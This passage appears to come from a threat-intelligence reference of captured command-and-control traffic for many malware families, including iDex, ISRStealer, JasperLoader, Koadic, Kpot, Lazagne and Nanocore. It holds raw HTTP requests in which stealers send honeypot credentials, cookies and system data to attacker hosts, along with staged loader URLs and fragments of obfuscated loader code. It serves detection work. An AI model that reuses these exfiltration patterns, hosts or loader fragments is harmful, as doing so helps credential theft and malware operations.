-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="platform"

null
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="user"

admin
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="passwordCount"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="coins"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="forms"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="cookies"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="ccCount"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="telegram"

0
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="steam"

null
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="logs"; filename="Archive.zip"
Content-Type: zip

PK........|e.P.R.y........=...Browsers/Cookies/Firefox Mozilla_nltxvmn2.default_Cookies.txt..]s.0.........r..b.V.Tk...CB.h......bggg........>y&..t2+u).26.>3.^..........(....$.C...o..n9.........P.4.fHTa9{OH.Q.I....?W...HG..&YC6
..W.fR.9...x...E.r2..^.."....hM..|n.......e.Ef`+.P .!Lm....B.a.MQj..T.3W$..1....J..c.....n.. ..<j......Cz...@. ..4n...u-..{...\[.f.........#..t..^.F0D&6].Q.....%.~..IE...(qH..{.JT.K).B|......A.^..<..P....(..s..3.........)..........]A.......a}.D...L.|.t. ...N.eA...mF.;.5...C.<.G..9...A.G..lRMC.5..../..3/_L..H.x....N5....>..Zg!v;.....c..7r4.......X....(....}U.^...;.k.>....7PK........|e.P....i...Jr......Screenshot.png..w8[...o"v..G..Y#f..U]F......J.XE4}.......}...U...XuW.yq.|.....*.P....&.b.v.R.[......^.>..PK..........|e.P.R.y........=.................Browsers/Cookies/Firefox Mozilla_nltxvmn2.default_Cookies.txtPK..........}e.PpT.-.... ...+.................Browsers/Cookies/Chrome_Default_Cookies.txtPK..........|e.P....i...Jr................Y...Screenshot.pngPK..........}e.P?c .T...Z...
.................Passwords.txtPK..........}e.P.s%.[...v.................m...Browsers.txtPK..........}e.PE.............................Information.txtPK....................iDex STEALER VERSION : 1.0.0
==========================GEOIP Info==========================
IP : 84.17.36.75
 Country : Sweden
CountryCode : SE
Region : AB
Region Name : Stockholm
City : Stockholm
Zip : 164 94
TimeZone : Europe/Stockholm
ISP : Datacamp Limited

==========================Hardware Info==========================

Username : admin
PCName : USER-PC
UUID : 00371-461-1206131-85808
HWID : EEEB5D54788042A7B542739BBC26CF4B
OS : Windows 7 x64
CPU : Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz
GPU : Standard VGA Graphics Adapter
RAM : 4 GB
MAC : 5254004AAD21
Screen Resolution : 1280x720
Layout Language : English (United States)
PC Time : 4/3/2020 12:43:57 PM (UTC) Coordinated Universal Time

==========================Program Info==========================
Adobe Flash Player 27 ActiveX 27.0.0.187
<redacted>
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702 14.21.27702.2


==========================Program Info==========================
svchost
lsm
svchost
spoolsv
svchost
lsass
dllhost
SearchProtocolHost
svchost
csrss
e197329d5376b93a60e67a43d5390a16dae5e813c2ee3708420a785d8b1b1a46
csrss
dwm
services
windanr
wininit
svchost
SearchFilterHost
taskhost
svchost
IMEDICTUPDATE
SearchIndexer
svchost
explorer
svchost
OSPPSVC
SearchProtocolHost
svchost
svchost
winlogon
smss
System
Idle

-----------------------------8d7d7ccad7ce23c--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex1.png "iDex")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex2.png "iDex")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex3.png "iDex")

#### iDex New aka MatrixMax stealer
~~~
POST /gate.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: max099801.000webhostapp.com
Content-Length: 936413
Expect: 100-continue
Connection: Keep-Alive

zipx=UEsDBBQAAAgIALOmj
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex-new.png "iDex New")

#### Imminent RAT
~~~
00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")

#### ISRStealer
~~~

GET /boss/index.php?action=add&username=honey@pot.com&password=honeypass356&app=Opera&pcname=USER-PC&sitename=https://www.facebook.com HTTP/1.1
User-Agent: HardCore Software For : Public
Host: expressdeliveryfx.com
Cookie: PHPSESSID=ni2v6p8vt6p48qcvm48rj7qqt0

HTTP/1.1 200 OK
Connection: Keep-Alive
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Tue, 08 Oct 2019 14:06:15 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")

#### JasperLoader
~~~
GET /?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
Host: green.datota.it
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 28 Mar 2019 17:41:51 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 115
Connection: keep-alive
X-Powered-By: PHP/5.4.16

u|http://red.greenmira.com/cryptbody2.php|http://red.greenmira.com/loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php
~~~
~~~
GET /cryptbody2.php?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
Host: red.greenmira.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 28 Mar 2019 17:41:51 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.16

t6i3jf5s(h6 ac(wtGite5ite0-bdUsaI53Cwfu52ls4tf6u0eryze76)3x.ccNi3af5mtdex4 6y-76m4da05tu1cijhzw jz'02RdtU7i|v2UjsAzu|86BcxYtz|0gCehNuh'hw 4a-ixo07rwg 9v(tcGh3exdtai-bwWa7m7sixdOyibybjxfe6zcxdtja cj-86cjdls1awisu3s7b c1W35i3dn1s36z2iz_hgCvuo36m3aphxucyt6je9ersbShuyxxsxittfeyhm5y xc-8vP5arw5o17pujed4r44t1iyhu i4Mfsowedude2vlie)0a.cdMt6ovtdybe6xl09 bs-xumu1ah8tefc94ht3 8x'3iV87Mftwvya20r74ej8'3h ac)3x{w7 ydeyaxueijjtus;sg 6w}zw e2 
ezFavu0vnavc66tztiv2owhnx9 yeChzr9cecja02ty3eu6Suvh7uo42rc3tg9ci9u49tdu(1j 2z$f7lvbngfk0y,a4 7c$etAehrfegz5uzbm98eyhnaft7zsf4,fc zz$efW2johbr28kihihfnvcga5Divijar2sezyc9ithxog6rxty39 1f)t1{eb 
vv yw 5bt3wrt1ytu{ai 
cc 01 wb tz b9$41Sz9hbheacly2l64 us=sh gbNz
~~~
~~~
GET /loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
Host: red.greenmira.com

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 28 Mar 2019 17:41:51 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.16

vtyzhsjuxvzxhbgfsdzdzzb = " ";
ibcvwj = new Array();
ibcvwj.push("iavSxyfERDVE(t8E8a974CDQ6y");
ibcvwj.push("");
ibcvwj.push("885tSDCB4aw");
ibcvwj.push("wR6EREzW>CzEz54zRy361wRDt97y");
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jasperloader.png "JasperLoader")

#### JsOutProx
~~~
POST / HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-Form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: _uot=43344241333634375f7c5f38396139633066382d393535362d346339662d626363642d6330373464646331346230395f7c5f555345522d50435f7c5f61646d696e5f7c5f4d6963726f736f66742057696e646f777320372050726f66657373696f6e616c205f7c5f362e312e373630315f7c5f4a734f757450726f785f7c5f70696e67
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0
Content-Length: 0
Host: 91.189.180.199:9989

HTTP/1.1 200 OK
Content-Type: image/jpeg
Set-Cookie: _utl=73646e5f7c5f
Content-Length: 20164
Connection: close

AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkDAAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW
~~~
Hex decoded cookie example from above:
~~~
C4BA3647_|_89a9c0f8-9556-4c9f-bccd-c074ddc14b09_|_USER-PC_|_admin_|_Microsoft Windows 7 Professional _|_6.1.7601_|_JsOutProx_|_ping
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jsoutprox.png "JsOutProx")

#### JSSLoader
~~~
POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
Content-Type: application/json
Host: dempoloka.com
Content-Length: 242
Expect: 100-continue
Connection: Keep-Alive

AAAAAA==
AQAAAA==
VGhlIGlucHV0IGlzIG5vdCBhIHZhbGlkIEJhc2UtNjQgc3RyaW5nIGFzIGl0IGNvbnRhaW5zIGEgbm9uLWJhc2UgNjQgY2hhcmFjdGVyLCBtb3JlIHRoYW4gdHdvIHBhZGRpbmcgY2hhcmFjdGVycywgb3IgYW4gaWxsZWdhbCBjaGFyYWN0ZXIgYW1vbmcgdGhlIHBhZGRpbmcgY2hhcmFjdGVycy4g
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jssloader.png "JSSLoader")

#### Keybase
~~~
GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
Host: pacificglobal.ga
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 04 Oct 2019 19:55:10 GMT
Content-Type: text/html
Content-Length: 985
Connection: keep-alive
Vary: Accept-Encoding
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-cache

<html><body><script type="text/javascript" src="/aes.js" ></script><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("f655ba9d09a112d4968c63579db590b4"),b=toNumbers("98344c2eee86c3994890592585b49f80"),c=toNumbers("ee3d72471e3c40514be9a177719112c3");document.cookie="__test="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/"; location.href="http://pacificglobal.ga/panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356&i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")

#### Koadic
~~~
POST /html?CRADZPYFZ4=825b2f6bafed407c88254aa1e804be93;9Q90FBZM0Q=; HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
Accept: */*
Accept-Language: en-us
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
encoder: 1252
shellchcp: 437
Content-Length: 140
Host: googlechromeupdater.twilightparadox.com:448

USER-PC\admin~~~USER-PC~~~Windows 7 Professional***7601~~~Unknown~~~x86~~~C:\Users\admin\AppData\Local\Temp
~~~192.168.100.159~~~1252~~~437

HTTP/1.0 200 OK
Server: Apache
Date: Wed, 22 Jan 2020 16:29:00 GMT
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/koadic.png "Koadic")

#### Kpot stealer
Follow tcp stream, not http stream in wireshark
~~~
GET /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Host: allseasongudinc.tech

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 27 Aug 2019 13:52:09 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.1.28

194
KwV4X3wlPk10s8hXH869gjRybIA8vP7vCwSm1Z2WW5LpEMiELVOQvustrfDp9B9igx9Jz8+noWaPlvipqvlX1nEJsgEGpkK29iHNRB5rmSyH9hPAko1ndCVOfVjGwUO/THlWJSdlDlb0FyJA2+ji7xH/Hlcwx38AIJ1SHUpp+hYHUnavdTv5uJnIAoB23+3dt7f1I54mr2Pp+eddWPHgFeIL/2BeLqaWQL1IzY1EqZhS9oIluDYmojSWgWeu6mecE5suxDRksh0KOyA7518HX4ziYflt6gBOa+daqP42C7K7PspsZGUMTRIRKayAQIT84HYmE7a/jRK1twsOz8gdJIrbaOTLaZWx/4q3Nd8bAB2yH8PvCwRz2YVsmzjBv93n3ksOHYuFtO1GcnOk0Igj
0

POST /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
Content-Encoding: binary
Host: allseasongudinc.tech
Content-Length: 1965022

P@F,jbhNH2pUP_s..tzH	W-.z.Cb]_u.PBCy9bhNH2pUdoG4PBCy9bhNH2pUdo.r...<|XH	:S.7...U 2'.M.4.!Q.:..!@..*.]
.=.q.:.."G..,.eP+...I.%A3L$OI4l+,.B.@.R+rqh{w@.TP.p.5`]+~
.{vA	TQ.y8.%
A%]>%m.V.GDq.Acn]v.b{vK.U^D{.GbTVs.ZqsO.[]xx.I_W_q.ir{H3Hbn.t6.-#.q...?p.-.r.7'.
%Q"."	I.	:)n=<..(G?$7%n..*'E.	'.(_9'0%u
..qcE.1;.b~6;
4h;..z4_%)z}...Mxh
'&U^6..h>arqM3T[vy.Fmn\w.c{vM.h[~~.I`R_t
ZqsO.[Xvy8Z_7=.|...so_Zh.g9.YZv.`..HxS+
}.3.S-u..tw8z![~xq6a&I#Y>!+..Sb,!\.{..*.ZssK
h^}p.Ec\et.hqzL
Pb}x.FlQYw.iHpI.UQ~p.z.n<.w...+3&'.u.@d\_~.eH!.W.F-'___U_u.ZtpA.W^vB.@mWVr.bHpI.TQ{~.Cln\w.g{sA.hBDhm6."&.q...?.+$.
.P...%V50..I../<S,.
.5[#-%
e5. ,].&8,([;+&
e..9.z@.!=.f.l7.Mob.	.@fn..C"{2JT..=.|=x#=.m.r. V.^z-Z]...&Mc."1t._..`'<..%S?.7@V[Y4.m>
;.qSZ#7.T.F-'___V^s.d{qA.Vb}~.IgRYv.fHpI.SX{q.zfVZv.hpuI.h[~~.Ie\^M.Z..73SF.}.GmQ_s.`lrI.RZw{.Fd\\s.gsqL.ZF..x$$U#.ea.".W.<-x.z4..*@~!,..hZ.|.DlVWq.ZqtO.U_{{.@_W_..iqwI3QZ{x.Hm\Zu>cruN.RP.B.zu;).r...<f$...~5.^O.F1 !.K>	>8V.!.3
]30,
V....[.1..4h.-,.P....].	/;.b...N...:E8.4..Me";3..Q.}0m .>)&A.'9.P6'D.S.0..(_~!,..hQ|y.zfR^~.gwpO	h[~p.IfP_M.arwL.QZ|
~~~
~~~
GET /admtest/configuration.php?botid=BEF522C314BC1291311131 HTTP/1.1
Host: 213.226.100.184
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 13 Jul 2020 08:26:56 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot.png "Kpot stealer")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot2.png "Kpot stealer")

#### KrugBot
~~~
POST /absc/index.php HTTP/1.0
Host: raiseyourdongers.wtf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 224

tSVkhHUFWeXjujTxCNBQl7h1QW2zElMRx+g8ceDNF/4mUj4PV8MaCjFjhqCGYGprTPLjXu5i
w+xWBGqDB44jDCJcr66AgCqhZYhj04B5PCPqMNaf8It2IfuX9Ffysaqp+tjcUhGW3JH1nJk8
ud1kko0C6+v/tp2PLOVR0ac3GacRi0dUf/+ASue6AJNOfh4WliURnubviRXJkcj+5f7vA3Xa
jg==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krugbot.png "Krugbot")

#### Krypton Stealer
~~~
POST /connect_meta.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Client
Host: orl05511cn.temp.swtest.ru
Content-Length: 26
Cache-Control: no-cache

id=01&message=test_message
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")

#### Lazagne
~~~
POST /te.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------58748130728276
User-Agent: Mozilla/5.0 Gecko/20100115 Firefox/3.6
Host: 185.86.148.123
Content-Length: 1526
Cache-Control: no-cache

-----------------------------58748130728276
Content-Disposition: form-data; name="userfile"; filename="admin-USER-PC-passwords.txt"
Content-Type:application/x-gzip


########## User: admin ##########

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://m.facebook.com
Login: honey@pot.com
Password: honeypass356

------------------- Outlook passwords -----------------

[-] Password not found !!!
Account Name: honey@pot.com.
POP3 User: honey@pot.com.
POP3 Server: 192.168.1.1.
u'Delivery Store EntryID: \x00\x00\ua138\u10bb\ue505\u1a10\ubba1\x08\u2a2b\uc256\x00\u736d\u7370\u2e74\u6c64l\x00\x00\u494e\u4154\ubff9\u01b8\uaa00\u3700\u6ed9\x00\x00C:\\Users\\admin\\Documents\\Outlook Files\\honey@pot.com.pst\x00'
SMTP Secure Connection: 0
SMTP Server: 192.168.1.1.
Mini UID: 224868084
'Delivery Folder EntryID: \x00\x00\x00\x00\x81 \xa1\x9f\x92\x06>N\x9c\xc7t\xd9H\xba>f\x82\x80\x00\x00'
u'clsid: \u457b\u3444\u3537\u3134\u2d31\u3042\u3644\u312d\u4431\u2d32\u4338\u4233\u302d\u3130\u3430\u3242\u3641\u3736\u7d36'
Display Name: HoneyPot Mail.
POP3 Password: honeypass356.
Email: honey@pot.com.
u'Leave on Server: \u3139\u3537\u3730'

------------------- Google chrome passwords -----------------

[+] Password found !!!
URL: 
Login: honey@pot.com
Password: honeypass356


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.84299993515

-----------------------------58748130728276--

HTTP/1.1 200 OK
Date: Tue, 29 Oct 2019 21:10:11 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 1
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lazagne.png "Lazagne")

#### Loda
I've never seen this without the beta flah
~~~
x|lugocv|x|admin|WIN_7|X86| |Disabled|1.1.2|ddd|Pr720X21280X3|Desktop|0|beta

ZeXro0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/loda.png "Loda")

#### Lokibot

follw tcp stream, not http stream in wireshark
~~~
POST /sky/five/fre.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: fueda.info
Accept: */*
Content-Type: application/octet-stream
Content-Encoding: binary
Content-Key: 8DAA705A
Content-Length: 176
Connection: close

..'.......ckav.ru..
...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")

#### Metamorpho/Metamorfo BR Banker
~~~
POST / HTTP/1.0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
Host: 18.217.112.176
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: identity
User-Agent: Mozilla/3.0 (compatible; Indy Library)

spxndja=HERETEVFDEVFJERERFEERFFEXERFJFGFKER&kfcemfgj=CCO&gvtsavp=EFMFM&ixjpblda=HEDEEDOEGDODXCPDKDMDMDYEFDXEEDSCMEHFAFFCCDACMCTCSCMDCCXCQCSDUDLCMCMDOFFEXFDFAFKEYCCCKEFFFFAFLEVEUCCEDFLERFLEVFKCLCMCMEHFAFFEUFGFOFKCCDNEVEWEVFFEUEVFJCMCYCWDLCM&xhwen=YDL

HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:18:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:18:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
~~~
~~~
POST /hooponopono/puma.php HTTP/1.0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Host: leavenois.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/3.0 (compatible; Indy Library)

vv=OP22--22-10&vw=&mods=&uname=VVNFUi1QQw%3D%3D&cname=Ti05Ng%3D%3D&os=V2luZG93cyA3IFByb2Zlc3Npb25hbDYuMTc2MDEtNjQ%3D&is=&iss=SUUuQXNzb2NGaWxlLkhUTQ%3D%3D&iav=

HTTP/1.0 200 OK
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Tue, 22 Oct 2019 20:06:32 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorfo-1.png "Metamorpho")

#### Micropsia
~~~
POST /api/white_walkers/new HTTP/1.1
Connection: KeepAlive
Content-Type: multipart/form-data; boundary=--------121819110609549
Content-Length: 818
Cache-control: no-store
Host: accountforuser.website
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

----------121819110609549
Content-Disposition: form-data; name="daenerys"
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit

SkVOTklGRVItUENfSmVubmlmZXJfNUZ0MzNidWxETUMybzVG
----------121819110609549
Content-Disposition: form-data; name="betriebssystem"
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit

Windows 7 Service Pack 1 (Version 6.1, Build 7601, 64-bit Edition)
----------121819110609549
Content-Disposition: form-data; name="anwendung"
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit

ExecuteLibrary.exe v2.0.0
----------121819110609549
Content-Disposition: form-data; name="AV"
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit

No Instance(s) Available.
----------121819110609549--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/micropsia.png "Micropsia")

#### MilkyBoy
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
User-Agent: Adzq41ceq52e353512hSfj
Content-Length: 45
Host: qqwveqwevqwe.duckdns.org:10

key:Adz32151295uy129v5nqwrnvqwkjn5rv12n5vhSfj

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8593928
Server: Werkzeug/0.15.4 Python/2.7.6
Date: Wed, 09 Oct 2019 22:09:57 GMT

TVqQAAMAAAAEAAAA/

POST / HTTP/1.1
Host: qqwveqwevqwe.duckdns.org:10
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.11.1
key: Adz32516047vhSfj
filename: 58759853857.zip
Content-Length: 5334
Content-Type: multipart/form-data; boundary=80790cc2554f462cb375dcc301f5c66a

--80790cc2554f462cb375dcc301f5c66a
Content-Disposition: form-data; name="payload"; filename="payload"

PK........G.IO............
...PASSWORDS/PK........G.IO+&.6v...........e.txt=.I.. .....Wx./X....%......g[VN6A...z~......x}....xH......*b....<@.W.P..X......,|*.]$..
}..%.	.C{....7.W......Bas.....PK........I.IO................sys.txt].Ok.@....|..S...&jho.B..........R.[.OK(..].K.2.7.73o~...'..6D.>q....U..u.. .W..x.0....=.T.#...<0"....W.k.. .;..J1.q;X.{kz..S;_.f.t...D..Gh@......Q.v@G=}....m"...............Yy..!1U...i.xe...B.T%..	{5.....m...3.>....3.J..]Vh......&Y.@.8...T~1B!....l
kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK........G.IO................PASSWORDS/FBase/PK........G.IO................PASSWORDS/CBase/Google/PK........G.IO).L
........#...PASSWORDS/CBase/Google/cookies.json....PK........G.IO".......[...)...PASSWORDS/CBase/Google/loginpasswords.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...x...Z.sy...2......(X).r.......
.d...V:....%...r.$.......d@|cS3...PK........G.IO."{.o...C..."...PASSWORDS/CBase/Google/webdata.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%......&..x...V.cy..2..K..sS.....2Ss@..\>.P........b.0.PK........G.IO................PASSWORDS/FBase/Mozilla/PK........G.IOp.0.$.......$...PASSWORDS/FBase/Mozilla/cookies.json..Mk.@.....!......$......Vl$..~.......-..j-...R/s.y..}.....8..q.zm.[..n.~U..e).z..7.7..............
...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
@.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")

#### MirageFox
~~~
POST http://172.16.100.1/result%3Fhl%3Den%26meta%3Dghumeaylnlfdxfircvscxggbwkfnqdu HTTP/1.0
Accept: *.*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)
Proxy-Connection: Keep-Alive
Content-Length: 528
Encoding: gzip, deflate
Accept-Language: en-us
Host: 172.16.100.1
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/miragefox.png "MirageFox")

#### Nanocore

flag on "38 00 00 00 17" pattern
~~~
00000000  38 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")

flag on "40 00 00 00 17" pattern:
~~~
00000000  40 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 87 30 8f fa 78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
00000040  13 e5 2b 52                                        ..+R
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")

flag on "50 00 00 00 82" pattern:
~~~
00000000  50 00 00 00 82 c8 36 7a 87 1b 91 70 6b 20 7f 17   P.....6z ...pk ..
00000010  ea 86 3a e9 07 fc 40 ae 0f ac bc f5 f2 6d f3 98   ..:...@. .....m..
00000020  71 7a 0b 19 4c 8e 58 bb 6c 69 5a 99 55 4a 72 c6   qz..L.X. liZ.UJr.
00000030  92 ed 39 fe 74 2a 9d b4 09 ca 5a 4a 83 dc 99 16   ..9.t*.. ..ZJ....
